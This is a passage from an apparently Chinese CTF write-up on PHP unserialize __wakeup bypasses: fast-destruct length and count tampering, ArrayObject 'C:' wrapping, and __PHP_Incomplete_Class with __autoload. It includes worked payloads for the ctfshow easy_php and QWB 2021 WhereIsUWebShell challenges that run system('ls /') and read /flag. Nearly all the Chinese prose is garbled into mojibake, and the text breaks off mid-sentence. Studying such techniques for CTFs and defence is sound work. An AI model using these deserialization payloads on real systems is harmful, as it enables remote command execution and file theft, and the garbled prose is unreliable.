è¿™é‡Œæˆ‘ä»¬çŸ¥é“çš„æ˜¯ï¼Œå¦‚æœè¯¥åºåˆ—åŒ–å­—ç¬¦ä¸²å†…éƒ¨å«æœ‰å¤šä¸ªç±»ï¼Œä»–ååºåˆ—åŒ–çš„æ—¶å€™ä¼šç”±å¤–å‘å†…è¿›è¡Œã€‚å¯¹äºä¸Šè¿°payloadï¼Œå®ƒçš„ä¿®æ”¹å¤„éƒ½æ˜¯é’ˆå¯¹çš„æœ€å†…éƒ¨çš„ç±»ï¼Œè¿™æ ·çš„è¯PHPåœ¨è§£æçš„æ—¶å€™è®¤ä¸ºè¯¥ç±»æ ¼å¼æœ‰é—®é¢˜ï¼Œç›´æ¥è¢«GCè®¤å®šä¸ºåƒåœ¾è€Œè°ƒç”¨ææ„å‡½æ•°å»å›æ”¶ã€‚ æ¥ä¸‹æ¥ç»§ç»­çœ‹å…¶ä»–payload //æ­£å¸¸payload O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:4:â€œAendâ€;s:1:â€œ1â€;} //å¤–éƒ¨ç±»å±æ€§é”®é•¿åº¦å¼‚å¸¸payloadï¼š //å…ˆå¤–ç±»__destruct()åå†…ç±»__wakeup() O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:6:â€œAendâ€;s:1:â€œ1â€;}//ä¿®æ”¹ä¸ºäº†6 //æ­£å¸¸payload O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:4:â€œAendâ€;s:1:â€œ1â€;} //å¤–éƒ¨ç±»å±æ€§å€¼é•¿åº¦å¼‚å¸¸payloadï¼š //å…ˆå¤–ç±»__destruct()åå†…ç±»__wakeup() O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:4:â€œAendâ€;s:2:â€œ1â€;} O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:4:â€œAendâ€;s:1:â€œ12â€;}//ä¿®æ”¹ä¸ºäº†12 å¯ä»¥çœ‹åˆ°ä¸Šé¢è¿›è¡Œäº†ä¿®æ”¹å¤–éƒ¨ç±»çš„æ•°å­—ï¼Œé‚£è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå†…éƒ¨ç±»è¢«è®¤ä¸ºæ˜¯æ­£å¸¸çš„ï¼Œåˆ™è°ƒç”¨å†…éƒ¨ç±»çš„wakeupï¼Œä¹‹ååœ¨å¤„ç†å¤–éƒ¨ç±»ï¼Œå½“çœ‹åˆ°å¤–éƒ¨ç±»é•¿åº¦ä¸åŒ¹é…ï¼Œäºæ˜¯è®¤ä¸ºæ˜¯åƒåœ¾ï¼Œç›´æ¥è°ƒç”¨ææ„å‡½æ•°å›æ”¶ã€‚ è¿™é‡Œä¹Ÿå°±è¯´æ˜äº†ä¸Šè¿°cveçš„ç»•è¿‡ï¼Œæ˜¯æ”¹å˜ç±»å±æ€§çš„å€¼ï¼Œå…¶æœ¬è´¨ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚ æ­¤æ—¶æˆ‘ä»¬åˆå¯ä»¥æƒ³åˆ°ä¿®æ”¹å†…éƒ¨ç±»çš„å±æ€§å€¼ã€å±æ€§é”®ç­‰ç­‰çš„é•¿åº¦ O:1:\"A\":2:{s:4:\"info\";O:1:\"B\":1:{s:3:\"end\";N;}s:3:\"end\";s:1:\"1\";} //æ­£å¸¸ O:1:\"A\":2:{s:4:\"info\";O:1:\"B\":2:{s:3:\"end\";N;}s:3:\"end\";s:1:\"1\";} //payload è¿™é‡Œå¯ä»¥çœ‹åˆ°ä»–ä¿®æ”¹äº†å†…éƒ¨Bç±»çš„å±æ€§ä¸ªæ•°ï¼Œè¿™ä¼šå¯¼è‡´ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒPHPè®¤ä¸ºBæœ‰é—®é¢˜ï¼Œç›´æ¥è°ƒç”¨ææ„æ¶ˆé™¤ï¼Œä¹‹åå¤–éƒ¨çš„Aç±»ä¼šæ­£å¸¸ååºåˆ—åŒ– O:1:\"A\":3:{s:4:\"info\";O:1:\"B\":1:{s:3:\"end\";N;}s:3:\"end\";s:1:\"1\";}//ä¿®æ”¹å¤–éƒ¨å±æ€§ é‚£è¿™é‡Œå°±æ˜¯ç¬¬ä¸€ä¸ªcveçš„ç»•è¿‡äº†ï¼Œä»–ä¼šå…ˆæ‰§è¡ŒBç±»çš„wakeupæ–¹æ³•ã€æ¥ç€è®¤ä¸ºAä¸æ­£å¸¸ï¼Œä¸ä¼šæ‰§è¡ŒAçš„wakeupç›´æ¥è°ƒç”¨ææ„æ¶ˆé™¤ã€‚ç­‰ç­‰ç­‰ç­‰ï¼Œè¿™é‡Œè‚¯å®šè¿˜æœ‰å¾ˆå¤šçš„å¼•ç”³ï¼Œæ¯”å¦‚åˆ é™¤å†…éƒ¨ç±»çš„åˆ†å·ã€èŠ±æ‹¬å·ç­‰ç­‰ã€‚ è¯´äº†è¿™ä¹ˆå¤šï¼Œå…¶å®å°±æ˜¯æˆ‘ä»¬åœ¨é‡åˆ°å¿…é¡»å¾—ç»•è¿‡wakeupçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹çœ‹è¯¥æ–¹æ³•åœ¨å“ªä¸ªç±»ä¸‹é¢ï¼Œé‚£æˆ‘ä»¬å°±è®©å“ªä¸ªç±»çš„åºåˆ—åŒ–æ•°æ®ä¸æ­£å¸¸ï¼Œä»è€Œç›´æ¥è°ƒç”¨è¯¥ç±»çš„ææ„å‡½æ•°è€Œç»•è¿‡wakeupã€‚ ä½¿ç”¨Cç»•è¿‡ ç‰ˆæœ¬é™åˆ¶ï¼š 5.3.0 - 5.3.29 5.4.0 - 5.4.45 5.5.0 - 5.5.38 5.6.0 - 5.6.40 7.0.0 - 7.0.33 7.1.0 - 7.1.33 7.2.0 - 7.2.34 7.3.0 - 7.3.28 7.4.0 - 7.4.16 8.0.0 - 8.0.3 Cæ˜¯å› ä¸ºPHP 5 ä¸­å¢åŠ äº†æ¥å£ï¼ˆinterfaceï¼‰åŠŸèƒ½ã€‚PHP 5 æœ¬èº«æä¾›äº†ä¸€ä¸ª Serializable æ¥å£ï¼Œå¦‚æœç”¨æˆ·åœ¨è‡ªå·±å®šä¹‰çš„ç±»ä¸­å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œé‚£ä¹ˆåœ¨è¯¥ç±»çš„å¯¹è±¡åºåˆ—åŒ–æ—¶ï¼Œå°±ä¼šè¢«æŒ‰ç…§ç”¨æˆ·å®ç°çš„æ–¹å¼å»è¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶ä¸”åºåˆ—åŒ–åçš„æ ‡ç¤ºä¸å†æ˜¯ Oï¼Œè€Œæ”¹ä¸º Cã€‚C æ ‡ç¤ºçš„æ ¼å¼å¦‚ä¸‹ï¼š C:&lt;name length&gt;:\"&lt;class name&gt;\":&lt;data length&gt;:{&lt;data&gt;} å…¶ä¸­ &lt;name length&gt; è¡¨ç¤ºç±»å &lt;class name&gt;çš„é•¿åº¦ï¼Œ&lt;data length&gt;è¡¨ç¤ºè‡ªå®šä¹‰åºåˆ—åŒ–æ•°æ®&lt;data&gt;çš„é•¿åº¦ï¼Œè€Œè‡ªå®šä¹‰çš„åºåˆ—åŒ–æ•°æ® &lt;data&gt; æ˜¯å®Œå…¨çš„ç”¨æˆ·è‡ªå·±å®šä¹‰çš„æ ¼å¼ï¼Œä¸ PHP åºåˆ—åŒ–æ ¼å¼å¯ä»¥å®Œå…¨æ— å…³ï¼Œè¿™éƒ¨åˆ†æ•°æ®ç”±ç”¨æˆ·è‡ªå·±å®ç°çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥å£æ–¹æ³•æ¥ç®¡ç†ã€‚ Serializableæ¥å£ä¸­å®šä¹‰äº† 2 ä¸ªæ–¹æ³•ï¼Œserialize()å’Œ unserialize($data)ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•ä¸ä¼šè¢«ç›´æ¥è°ƒç”¨ï¼Œè€Œæ˜¯åœ¨è°ƒç”¨ PHP åºåˆ—åŒ–å‡½æ•°æ—¶ï¼Œè¢«è‡ªåŠ¨è°ƒç”¨ã€‚å…¶ä¸­serializeå‡½æ•°æ²¡æœ‰å‚æ•°ï¼Œå®ƒçš„è¿”å›å€¼å°±æ˜¯&lt;data&gt;çš„å†…å®¹ã€‚è€Œunserialize($data)æœ‰ä¸€ä¸ªå‚æ•°$dataï¼Œè¿™ä¸ªå‚æ•°çš„å€¼å°±æ˜¯ &lt;data&gt;çš„å†…å®¹ã€‚ Cå¯ä»¥ç”¨æ¥ç»•è¿‡_wakeupï¼Œå› ä¸ºcustom objectå¹¶ä¸æ”¯æŒ__wakeup()ï¼Œä¸è¿‡Céœ€è¦å®ç°unserializeæ‰èƒ½ç»‘å®šä¸Šå±æ€§å€¼ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨Cä»£æ›¿Oèƒ½ç»•è¿‡wakeupï¼Œä½†é‚£æ ·çš„è¯åªèƒ½æ‰§è¡Œconstruct()å‡½æ•°æˆ–è€…destruct()å‡½æ•°ï¼Œæ— æ³•æ·»åŠ ä»»ä½•å†…å®¹ï¼Œå°±æ˜¯æŠŠæ­£å¸¸çš„ååºåˆ—åŒ–è¿›è¡Œä¸€æ¬¡æ‰“åŒ…ï¼Œè®©æœ€åç”Ÿæˆçš„payloadä»¥Cå¼€å¤´å³å¯ã€‚ é‚£å¦‚æœæˆ‘ä»¬åœ¨é‡åˆ°å¯¹è±¡æœ‰å±æ€§çš„æ—¶å€™å¦‚ä½•ä½¿ç”¨Cç»•è¿‡å‘¢ï¼Ÿ ç½‘ä¸Šçœ‹åˆ°ä½¬ä»¬é€‰æ‹©ç”¨å†…ç½®ç±»ç»•è¿‡ï¼Œæ¯”å¦‚ArrayObject &lt;?php $arr=array(\"a\"=&gt;1,\"b\"=&gt;2); $ao=new ArrayObject($arr); echo serialize($ao); å¯ä»¥çœ‹åˆ°æ˜¯Cå¼€å¤´çš„ï¼Œæ—¢ç„¶æ˜¯Cå¼€å¤´çš„ï¼Œå‡å¦‚æˆ‘ä»¬é‡åˆ°äº†è¿™æ ·çš„é¢˜ç›® 2023æ„šäººæ¯-easy_php &lt;?php error_reporting(0); highlight_file(__FILE__); class ctfshow{ public function __wakeup(){ die(\"not allowed!\"); } public function __destruct(){ system($this-&gt;ctfshow); } } $data = $_GET['1+1&gt;2']; if(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){ unserialize($data); } ?&gt; è¿™é‡Œçš„æ­£åˆ™è®©æˆ‘ä»¬ä¸èƒ½ä»¥Oæˆ–è€…aå¼€å¤´ï¼Œè¿™é‡Œå¯¹äºä»¥å‰çš„æ­£åˆ™ç»•è¿‡åŠæ³•éƒ½è¡Œä¸é€š &lt;?php class ctfshow{ public function __wakeup(){ die(\"not allowed!\"); } public function __destruct(){ system($this-&gt;ctfshow); } } $a=new ctfshow(); echo serialize($a); #O:7:\"ctfshow\":0:{}//åšè¿™ä¸ªpayloadå¾ˆæ˜æ˜¾ç»•è¿‡ä¸äº† è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ArrayObjectå¯¹æ­£å¸¸çš„ååºåˆ—åŒ–è¿›è¡Œä¸€æ¬¡åŒ…è£…ï¼Œè®©æœ€åè¾“å‡ºçš„payloadä»¥Cå¼€å¤´ã€‚è¿™é‡Œå®˜æ–¹æ–‡æ¡£è¯´ï¼š æ”¯æŒå‚æ•°ä¸ºæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°†å¾…ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œç»è¿‡è¯¥å†…ç½®ç±»çš„åŒ…è£…å³å¯ã€‚å› ä¸ºArrayObjectï¼Œä»–æ˜¯Cå¼€å¤´çš„ï¼Œå¹¶ä¸”å¯ä»¥ç»•è¿‡Oï¼Œç„¶åè¿˜å¯ä»¥å¸¦å±æ€§ååºåˆ—åŒ–ï¼Œç¬¦åˆæ¡ä»¶ï¼Œå› æ­¤å¯ä»¥æ„é€ payloadï¼š &lt;?php class ctfshow { public $ctfshow; } $pop = new ctfshow(); $pop-&gt;ctfshow = 'ls /'; $arr = array('hybcx'=&gt;$pop); echo serialize(new ArrayObject($arr)) ?&gt; å€¼å¾—æ³¨æ„çš„ç‚¹æ˜¯ï¼Œè¿™é‡Œè¿›è¡Œurlä¼ å‚çš„æ—¶å€™éœ€è¦å¯¹å˜é‡ä¸­çš„åŠ å·è¿›è¡Œurlç¼–ç ï¼Œå¦åˆ™ä¼šè¢«è¯†åˆ«ä¸ºç©ºæ ¼è€Œæ— æ³•æ­£å¸¸ä¼ å‚ï¼Œæœ€åæˆåŠŸå‘½ä»¤æ‰§è¡Œ æœ€åè¿™ä½ä½¬è¿˜æ‰¾åˆ°äº†å…¶ä»–å¯ä»¥è¿›è¡ŒåŒ…è£…çš„å†…ç½®ç±» &lt;?php $classes = get_declared_classes();foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array( 'unserialize', ))) { print $class . '::' . $method . \" \"; } }} ç»è¿‡æ‰€æœ‰æµ‹è¯•å‘ç°å¯ä»¥ç”¨çš„ç±»ä¸ºï¼š ArrayObject::unserialize ArrayIterator::unserialize RecursiveArrayIterator::unserialize SplObjectStorage::unserialize SplDoublyLinkedList::unserialize SplQueue::unserialize SplStack::unserialize å­—ç¬¦iã€dç»•è¿‡ æ¡ä»¶ï¼š &lt;8.0.3 ï¼ˆå…¨ç‰ˆæœ¬ï¼‰ &lt;?php echo unserialize('i:-1;'); echo \" \"; echo unserialize('i:+1;'); echo \" \"; echo unserialize('d:-1.1;'); echo \" \"; echo unserialize('d:+1.2;'); //è¾“å‡ºå¦‚ä¸‹ -1 1 -1.1 1.2 ?&gt; è¿™é‡Œæš‚æ—¶ä¸æ¸…æ¥šèƒ½ç»•è¿‡ä»€ä¹ˆã€‚ã€‚ã€‚ stdClassä¸__PHP_Incomplete_Class ç»•è¿‡ æ‰€æœ‰çš„ç±»éƒ½æ˜¯stdClassç±»çš„å­ç±»ï¼ŒstdClassæ˜¯æ‰€æœ‰ç±»çš„åŸºç±»ï¼Œä¸‹é¢å°±ç›´æ¥ç”¨ä½¬çš„å›¾äº† åœ¨PHPä¸­ï¼Œå½“æˆ‘ä»¬åœ¨ååºåˆ—åŒ–ä¸€ä¸ªä¸å­˜åœ¨çš„ç±»æ—¶ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ &lt;?php $raw = 'O:1:\"A\":1:{s:1:\"a\";s:1:\"b\";}'; var_dump(unserialize($raw)); /*Output: object(__PHP_Incomplete_Class)#1 (2) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(1) \"A\" [\"a\"]=&gt; string(1) \"b\" }*/ å¯ä»¥å‘ç°PHPåœ¨é‡åˆ°ä¸å­˜åœ¨çš„ç±»æ—¶ï¼Œä¼šæŠŠä¸å­˜åœ¨çš„ç±»è½¬æ¢æˆ__PHP_Incomplete_Classè¿™ç§ç‰¹æ®Šçš„ç±»ï¼ŒåŒæ—¶å°†åŸå§‹çš„ç±»åAå­˜æ”¾åœ¨__PHP_Incomplete_Class_Nameè¿™ä¸ªå±æ€§ä¸­ï¼Œå…¶ä½™å±æ€§å­˜æ”¾æ–¹å¼ä¸å˜ã€‚ è€Œæˆ‘ä»¬åœ¨åºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œserializeé‡åˆ°__PHP_Incomplete_Classè¿™ä¸ªç‰¹æ®Šç±»ä¼šå€’æ¨å›æ¥ï¼Œåºåˆ—åŒ–æˆ__PHP_Incomplete_Class_Nameå€¼ä¸ºç±»åçš„ç±»ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„åºåˆ—åŒ–ç»“æœä¸æ˜¯O:22:\"__PHP_Incomplete_Class_Name\":2:{xxx}è€Œæ˜¯O:1:\"A\":1:{s:1:\"a\";s:1:\"b\";},é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è‡ªå·±å¦‚ä¸‹æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸² æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾ å¯ä»¥çœ‹åˆ°åœ¨äºŒæ¬¡åºåˆ—åŒ–åï¼Œç”±äºO:22:\"__PHP_Incomplete_Class\":1:{s:1:\"a\";O:7:\"classes\":0:{}}ä¸­__PHP_Incomplete_Class_Nameä¸ºç©ºï¼Œæ‰¾ä¸åˆ°åº”è¯¥ç»‘å®šçš„ç±»ï¼Œå…¶å±æ€§å°±è¢«ä¸¢å¼ƒäº† å¼ºç½‘æ¯2021 WhereIsUWebShell è¿™é‡Œç½‘ä¸Šä¼¼ä¹æ‰¾ä¸åˆ°é¶åœºäº†ï¼Œåªèƒ½è·Ÿç€è¿‡ä¸€é &lt;?php // index.php ini_set('display_errors', 'on'); include \"function.php\"; $res = unserialize($_REQUEST['ctfer']); if(preg_match('/myclass/i',serialize($res))){ throw new Exception(\"Error: Class 'myclass' not found \"); } highlight_file(__FILE__); echo \"&lt;br&gt;\"; highlight_file(\"myclass.php\"); echo \"&lt;br&gt;\"; highlight_file(\"function.php\"); å¯ä»¥çœ‹åˆ°è¿™é‡ŒåªåŠ è½½äº†function.phpæ–‡ä»¶ï¼Œå¹¶ä¸”å¯¹ctferè¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–ï¼Œä¹‹ååœ¨åºåˆ—åŒ–åˆ¤æ–­å…¶ä¸­æœ‰æ²¡æœ‰myclasså…³é”®å­—ï¼Œå¦‚æœæœ‰åˆ™æŠ›å‡ºå¼‚å¸¸ ç”¨åˆ°çš„å…¶ä»–æ–‡ä»¶å¦‚ä¸‹ &lt;?php // myclass.php class Hello{ public function __destruct() { if($this-&gt;qwb) echo file_get_contents($this-&gt;qwb); } } ?&gt; &lt;?php // function.php function __autoload($classname){ require_once \"./$classname.php\"; } ?&gt; è¿™é‡Œå¯ä»¥è¯¦ç»†äº†è§£ä¸€ä¸‹__autoloadçš„ç”¨æ³•ï¼Œä¾‹å¦‚ç›¸åŒç›®å½•ä¸‹æœ‰è¿™æ ·å‡ ä¸ªæ–‡ä»¶ User.class.php; Person.class.php; Message.class.php; index.php; å¦‚æœæˆ‘ä»¬æ­¤æ—¶åœ¨ç›¸åŒç›®å½•ä¸‹çš„index.phpæ–‡ä»¶ä¸­è¿™æ ·å†™ï¼š function __autoload($className){ //ucfirst() å°†å­—ç¬¦ä¸²é¦–å­—æ¯å˜ä¸ºå¤§å†™ include(\"ucfirst($className)\".class.\".php\"); } //å°†ç±»åUserä½œä¸ºå‚æ•°ä¼ å…¥ $user=new User();//é€šè¿‡è‡ªåŠ¨åŠ è½½ç±»è°ƒç”¨User.class.phpæ–‡ä»¶ $person=new Person();//é€šè¿‡è‡ªåŠ¨åŠ è½½ç±»è°ƒç”¨Person.class.phpæ–‡ä»¶ $Message=new Message();//é€šè¿‡è‡ªåŠ¨åŠ è½½ç±»è°ƒç”¨Message.classphpæ–‡ä»¶ å¦‚ä¸Šè¿°ä»£ç æ‰€ç¤ºï¼Œåœ¨å½“å‰æ–‡ä»¶ä¸­æˆ‘ä»¬å¹¶æ²¡æœ‰å¯¹åº”çš„Userã€Personç­‰ç±»ï¼Œå½“æˆ‘ä»¬æƒ³ä½¿ç”¨çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨autoloadæ–¹æ³•ï¼Œå°†ç±»åä½œä¸ºå‚æ•°ä¼ å…¥ï¼ŒåŒ…å«å¯¹åº”çš„æ–‡ä»¶ã€‚ function.phpä¸‹æ˜¯ä¸€ä¸ªç”¨æ¥è‡ªåŠ¨åŠ è½½ç±»çš„å‡½æ•°ï¼Œæ¯”å¦‚å½“æˆ‘ä»¬æƒ³åŠ è½½ä¸€ä¸ªindex.phpæ–‡ä»¶ä¸å­˜åœ¨çš„Helloç±»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ è½½ä¸€ä¸ªmyclassç±»ï¼Œåˆ™function.phpæ–‡ä»¶ä¸­çš„autoloadæ–¹æ³•çš„classnameå‚æ•°èµ‹å€¼ä¸ºmyclassï¼Œå»è‡ªåŠ¨çš„åŒ…å«myclass.phpæ–‡ä»¶ã€‚è¿™æ ·Helloç±»å°±å¾—åˆ°äº†ã€‚ åœ¨è¿™ä¸ªé¢˜ç›®ä¸­æˆ‘ä»¬æ˜¯æƒ³è¦åŠ è½½Helloç±»æ¥è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œä½†æƒ³è¦å¼•å…¥helloç±»å°±è¦classnameä¸ºmyclassçš„ç±»ã€‚è¿™ä¸ªç±»å¹¶ä¸å­˜åœ¨ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥å»ååºåˆ—åŒ–ï¼Œåªä¼šåœ¨ååºåˆ—åŒ–myclassç±»çš„æ—¶å€™æŠ¥é”™æ— æ³•è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œæˆ–è€…åœ¨ååºåˆ—åŒ–Helloçš„æ—¶å€™æ‰¾ä¸åˆ°è¿™ä¸ªç±»è€ŒæŠ¥é”™ã€‚å› æ­¤å°±éœ€è¦ç”¨åˆ°__PHP_Incomplete_Classçš„å¤„ç†äº† æˆ‘ä»¬åªéœ€è¦åœ¨__PHP_Incomplete_Classå…¶ä¸­æ·»åŠ myclassç±»ï¼Œè¿™æ ·åœ¨ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„æ—¶å€™æ˜¯æ­£å¸¸çš„ï¼Œå…¶ä¸­çš„myclassç±»ä¼šè¢«æ”¾åœ¨__PHP_Incomplete_Class_Nameä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§å¦‚ä¸‹çš„æ€è·¯è¿›è¡Œæµ‹è¯• æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªå­˜åœ¨myclassä¸Helloç±»çš„æ–‡ä»¶ &lt;?php class Hello{ public $qwb; } class myclass{ } $pop = new Hello(); $pop-&gt;qwb = '/flag'; $pop1 = new myclass(); $arr = array($pop1, $pop); echo serialize($arr); //è¾“å‡ºï¼ša:2:{i:0;O:7:\"myclass\":0:{}i:1;O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}} ?&gt; ä¹‹åæˆ‘ä»¬å¯ä»¥åˆ é™¤ä¸Šé¢ä¸¤ä¸ªç±»è¿›ä¸€æ­¥æµ‹è¯• &lt;?php $pop2 = 'a:2:{i:0;O:7:\"myclass\":0:{}i:1;O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}}'; var_dump(unserialize($pop2)); array(2) { [0]=&gt; object(__PHP_Incomplete_Class)#1 (1) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(7) \"myclass\" } [1]=&gt; object(__PHP_Incomplete_Class)#2 (2) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(5) \"Hello\" [\"qwb\"]=&gt; string(5) \"/flag\" } } å¦‚ä¸Šé¢æ‰€ç¤ºï¼Œè¿™é‡Œè¾“å‡ºçš„å†…å®¹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å«æœ‰äº†__PHP_Incomplete_Class_Nameçš„å­˜åœ¨ï¼Œä½†æ¥ä¸‹æ¥çš„æ„é€ ä¼¼ä¹å¾—æ‰‹æ“äº†ã€‚è®©æˆ‘ä»¬è¿™æ ·æ„é€  a:2:{i:0;O:22:\"__PHP_Incomplete_Class\":1:{s:3:\"bcx\";O:7:\"myclass\":0:{}}i:1;O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}} è¿™é‡Œçš„è¯å‚è€ƒä¸Šé¢çš„è¾“å‡ºæ˜¯å®Œå…¨å¯ä»¥æ‰‹æ“çš„ï¼Œè¿™é‡Œæ„Ÿè§‰æ³¨æ„çš„ç‚¹å°±æ˜¯åœ¨æè¿°__PHP_Incomplete_Classçš„æ—¶å€™ä¼¼ä¹éœ€è¦ä¸ºå…¶æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²å±æ€§ï¼Œå¦‚ä¸Šé¢è¿™æ ·å†™s:3:\"bcx\";O:7:\"myclass\"å®é™…å°±æ˜¯bcx=new myclass() &lt;?php $raw = 'O:1:\"A\":1:{s:1:\"a\";s:1:\"b\";}'; var_dump(unserialize($raw)); /*Output: object(__PHP_Incomplete_Class)#1 (2) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(1) \"A\" [\"a\"]=&gt; string(1) \"b\" }*/ æ„Ÿè§‰å°±å¦‚åŒä¸Šè¿°ä¾‹å­ä¸€èˆ¬å¦‚æœæˆ‘ä»¬å°†__PHP_Incomplete_Class_Nameé™¤å»çš„è¯ï¼Œç”±äºå‰è€…__PHP_Incomplete_Classæè¿°çš„æ˜¯å…¶å«æœ‰ä¸¤ä¸ªå±æ€§Aå’ŒBï¼Œé‚£ä¹ˆä¿®æ”¹çš„æ—¶å€™å°±åº”è¯¥è¿™æ · object(__PHP_Incomplete_Class)#1 (2) { [\"b\"]=&gt; //è¿™é‡Œå¾—æœ‰å˜é‡æŒ‡å‘åé¢çš„å­—ç¬¦ä¸²Aï¼Œå› æ­¤è¿™é‡Œéœ€è¦æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ string(1) \"A\" [\"a\"]=&gt; string(1) \"b\" } é‚£å¯¹äºæˆ‘ä»¬é¢˜ç›®çš„ä¿®æ”¹å°±åº”è¯¥è¿™æ · object(__PHP_Incomplete_Class)#1 (1) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(7) \"myclass\" } //è½¬æ¢æˆ object(__PHP_Incomplete_Class)#1 (1) { [\"bcx\"]=&gt; string(7) \"myclass\" } //å†è½¬æ¢æˆ object(__PHP_Incomplete_Class)#1 (1) { [\"bcx\"]=&gt; object(7) \"myclass\" } æ¯•ç«Ÿè¿™é‡Œæˆ‘ä»¬éœ€è¦myclassè¢«è®¤ä½œæ˜¯ä¸€ä¸ªç±»ï¼Œå› æ­¤æœ€ç»ˆè¦å¦‚ä¸‹å›¾æ„é€  a:2:{i:0;O:22:\"__PHP_Incomplete_Class\":1:{s:3:\"bcx\";O:7:\"myclass\":0:{}}i:1;O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}} è¿™æ ·çš„è¯åœ¨ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä»–å°†myclasså½“åšä¸€ä¸ªç±»ï¼Œä½†å½“å‰æ–‡ä»¶æ²¡æœ‰è¯¥ç±»ï¼Œäºæ˜¯è‡ªåŠ¨è°ƒç”¨myclass.phpæ–‡ä»¶ï¼Œé‚£ä¹ˆHelloç±»ä¾¿è¢«å°†åœ¨åˆ°å½“å‰æ–‡ä»¶äº†ï¼Œæ¥ç€åé¢ååºåˆ—åŒ–Helloç±»çš„æ—¶å€™ä¾¿ä¼šè¢«æ­£å¸¸è§£æä¸ä¼šæŠ¥é”™ã€‚ ä½†åœ¨åç»­åºåˆ—åŒ–çš„å¯¹myclasså…³é”®è¯çš„æ£€éªŒä¸­ï¼Œç”±äºæˆ‘ä»¬çš„__PHP_Incomplete_Class_Nameä¸å­˜åœ¨ï¼Œå› æ­¤__PHP_Incomplete_Classè¯†åˆ«ä¸äº†åé¢çš„{s:3:\"bcx\";O:7:\"myclass\":0:{}}äºæ˜¯è¿™ä¸€æ®µä»£ç ä¾¿è¢«åˆ é™¤ã€‚ æœ€åæˆ‘ä»¬ä¹Ÿå¯ä»¥æˆåŠŸç»•è¿‡äº†ï¼Œå¯¹äºä¸Šè¿°é¢˜ç›®æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨åˆšåˆšå­¦åˆ°çš„fast-destructæ¥ç»•è¿‡ï¼Œå³ #ä¿®æ”¹åºåˆ—åŒ–æ•°å­—å…ƒç´ ä¸ªæ•° a:2:{i:0;O:7:\"myclass\":1:{s:1:\"a\";O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}}} #å»æ‰åºåˆ—åŒ–å°¾éƒ¨ } a:1:{i:0;O:7:\"myclass\":1:{s:1:\"a\";O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}} æŒ‰ç…§ä»å·¦è‡³å³çš„è§£æé¡ºåºï¼Œè¿™é‡Œaçš„å±æ€§å€¼æ­£ç¡®æ¥è®²æ˜¯ä¸€ä¸ªï¼Œä½†è¿™é‡Œä¿®æ”¹ä¸ºäº†ä¸¤ä¸ªï¼Œå¾ˆæ˜æ˜¾é”™äº†ï¼Œé‚£è¿™é‡Œæˆ‘è®¤ä¸ºå°±æ˜¯å­˜åœ¨PHPç‰ˆæœ¬çš„é—®é¢˜äº†ï¼ˆGPTè¯´çš„ï¼‰å¦‚æœPHPç‰ˆæœ¬æ°å½“ä¸”ä»£ç 